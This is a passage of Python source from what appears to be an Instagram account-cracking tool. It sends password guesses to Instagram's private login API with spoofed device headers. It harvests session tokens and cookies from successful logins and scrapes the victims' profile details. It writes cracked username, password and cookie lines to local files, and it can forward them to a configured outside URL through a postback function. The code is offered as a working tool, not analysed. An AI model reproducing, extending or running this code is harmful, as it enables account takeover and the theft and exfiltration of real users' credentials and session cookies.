login_source":"login","waterfall_id":str(uuid.uuid4()),"two_step_login_type":"one_step_login","login_source":"Login","is_platform_login":0,"INTERNAL__latency_qpl_marker_id":36707139,"is_from_aymh":0,"offline_experiment_group":"caa_iteration_v3_perf_ig_4","is_from_landing_page":0,"password_text_input_id":"29llew:97","is_from_empty_password":0,"is_from_msplit_fallback":0,"ar_event_source":"login_home_page","qe_device_id":zara_ig_device_id,"username_text_input_id":"29llew:96","layered_homepage_experiment_group":"Deploy:+Not+in+Experiment","device_id":zara_ig_android_id,"INTERNAL__latency_qpl_instance_id":1.3705642400282E13,"reg_flow_source":"login_home_native_integration_point","is_caa_perf_enabled":1,"credential_type":"password","is_from_password_entry_page":0,"caller":"gslr","family_device_id":zara_ig_family_device_id,"is_from_assistive_id":0,"access_flow_version":"pre_mt_behavior","is_from_logged_in_switcher":0}}),
                    'bk_client_context': json.dumps({"bloks_version":"d1e4aec4c37d352877c9c5a8560296d85f8a24301a44836fcf88c72dc969c3a1","styles_id":"instagram"}),
                    'bloks_versioning_id': 'd1e4aec4c37d352877c9c5a8560296d85f8a24301a44836fcf88c72dc969c3a1'
                }
                resp = self.session_request.post('https://b.i.instagram.com/api/v1/bloks/async_action/com.bloks.www.bloks.caa.login.async.send_login_request/',data=data,headers=_header_)
                if 'logged_in_user' in resp.text.replace('\\',''):
                    done +=1
                    try:
                        ig_bearer_token = json.loads(base64.b64decode(re.search('"Bearer IGT:2:(.*?)"',resp.text.replace('\\','')).group(1)))
                        ig_cookie_users = ';'.join(['%s=%s'%(name,value) for name,value in ig_bearer_token.items()])
                    except AttributeError:
                        ig_bearer_token = ''
                        ig_cookie_users = ''
                    kuki = f'{client.generate_instagram_cookie()}{ig_cookie_users};'
                    info = client.account(kuki)
                    ig_first_name, ig_phone_number, ig_user_birthday, ig_user_bio, ig_followes_user, ig_following_user, ig_email_user, ig_feed_post = info.ProfileInfo(uid=uid,username=users)    
                    rest =  f'{users}|{pwd}|{ig_followes_user}|{ig_following_user}|{ig_feed_post}|{kuki}'
                    self.simpan_hasil(rest, True)
                    self.EliteStyle('api manual',rest,True)
                    break
                elif 'redirection_to_checkpoint' in resp.text.replace('\\',''):
                    check +=1
                    ig_followers_user, ig_following_user, ig_feed_post = client.account(None).friends_user_chek(users)
                    rest = f'{users}|{pwd}|{ig_followers_user}|{ig_following_user}|{ig_feed_post}'
                    self.EliteStyle('api validate',rest,False)
                    self.simpan_hasil(rest, False)
                    break
                elif '<h1>5xx Server Error</h1>' in resp.text:
                    print(f' {self._dead_} Server Error!! modpes',end='\r', flush=True)
                    continue
                
            except (httpx.NetworkError,httpx.ConnectError,httpx.Timeout):
                time.sleep(20)
        colok +=1

    def instagram_default(self):
        return {
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "ig-intended-user-id": "0",
            "priority": "u=3",
            "x-bloks-is-layout-rtl": "false",
            "x-bloks-prism-button-version": "CONTROL",
            "x-bloks-prism-colors-enabled": "false",
            "x-bloks-prism-font-enabled": "false",
            "x-bloks-prism-indigo-link-version": "0",
            "x-bloks-version-id": "d1e4aec4c37d352877c9c5a8560296d85f8a24301a44836fcf88c72dc969c3a1",
            "x-fb-client-ip": "True",
            "x-fb-connection-type": "WIFI",
            "x-fb-friendly-name": "IgApi: bloks/async_action/com.bloks.www.bloks.caa.login.async.send_login_request/",
            "x-fb-request-analytics-tags": '{"network_tags":{"product":"567067343352427","purpose":"fetch","surface":"undefined","request_category":"api","retry_attempt":"0"}}',
            "x-fb-server-cluster": "True",
            "x-ig-android-id": "android-00159caa5a8c5dcf",
            "x-ig-app-id": "567067343352427",
            "x-ig-app-locale": "in_ID",
            "x-ig-attest-params": '{"attestation":[{"version":2,"type":"keystore","errors":[-1013],"challenge_nonce":"9aEdPhIfQr6moTbWDOjJ42e8XNlApwZH","signed_nonce":"","key_hash":""}]}',
            "x-ig-bandwidth-speed-kbps": "-1.000",
            "x-ig-bandwidth-totalbytes-b": "0",
            "x-ig-bandwidth-totaltime-ms": "0",
            "x-ig-client-endpoint": "com.bloks.www.caa.login.login_homepage",
            "x-ig-capabilities": "3brTv10=",
            "x-ig-connection-type": "WIFI",
            "x-ig-device-id": "1c09c7ed-3663-447e-b6be-2c331f571ce5",
            "x-ig-device-locale": "in_ID",
            "x-ig-family-device-id": "7e744a2d-0dc2-4fb3-841e-983943d0fe35",
            "x-ig-mapped-locale": "id_ID",
            "x-ig-nav-chain": "com.bloks.www.caa.login.login_homepage:com.bloks.www.caa.login.login_homepage:1:button:1751129468.218::",
            "x-ig-timezone-offset": "28800",
            "x-ig-www-claim": "0",
            "x-mid": "aF-68wABAAGGzuqBjQbXeDXbKl9o",
            "x-pigeon-rawclienttime": "1751129512.735",
            "x-pigeon-session-id": "UFS-019d542a-c69d-4009-85f1-8148b57c48a3-0",
            "x-tigon-is-retry": "False",
            "x-zero-balance": "",
            "x-zero-eh": "IG0e09d776530888418ab70f3822fbb4e1",
            "user-agent": "Instagram 384.0.0.46.83 Android (28/9; 255dpi; 768x1366; Asus; ASUS_Z01QD; ASUS_Z01QD; intel; in_ID; 746325164)",
            "x-fb-conn-uuid-client": "f60a1d29bb3de9bbaf9235dea9291557",
            "x-fb-http-engine": "Tigon/MNS/TCP"
        }
    
    def simpan_hasil(self, data_json, status_login):
        now = datetime.now()
        fil = f'data/Elite3-OK-{now.day}-{now.month}-{now.year}.json' if status_login is True else f'data/Elite3-CP-{now.day}-{now.month}-{now.year}.json'
        with open(fil,'a') as f:
            f.write(f'{data_json}\n')

    def EliteStyle(self,api_type,rest,hack):
        print('\r                                                       \n')
        if hack:
            username,password,followers,following,feed,cookie = rest.split('|')
            zara_dev = Tree('\r\n',style='bold green')
            zara_dev.add(f'{username}|{password}')
            zara_dev.add(f'{followers}|{following}|{feed}').add(cookie)
            RichPrint(zara_dev)
            if self.postbackStatus == True:
                _zara_ = Postback(data=None).Check()
                if _zara_[1] and any(x in _zara_[1] for x in ['ok', 'all']):
                    Postback(f'success: {username}|{password}|{followers}|{following}|{feed}|{cookie}').SendPostback(_zara_[0])
        else:
            
            username,password,followers,following,feed = rest.split('|')
            zara_dev = Tree('\r\n',style='bold red')
            zara_dev.add(f'{username}|{password}')
            zara_dev.add(f'{followers}|{following}|{feed}')
            RichPrint(zara_dev)
            if self.postbackStatus == True:
                _zara_ = Postback(data=None).Check()
                if _zara_[1] and any(x in _zara_[1] for x in ['cp', 'all']):
                    Postback(f'checkpoint: {username}|{password}|{followers}|{following}|{feed}').SendPostback(_zara_[0])

class Postback:
    def __init__(self, data=None):
        self.data = data

    def Check(self):
        if os.path.isfile('data/user_postback.json'):
            with open('data/user_postback.json', 'r') as f:
                f = json.loads(f.read())
            
            self.url = f['Api']
            self.typ = f['send_data']
            return self.url, self.typ
        else:return None,None
    
    def SendPostback(self, api_):
        try:
            if self.data:
                httpx.post(api_.format(self.data),timeout=60)
        except:pass


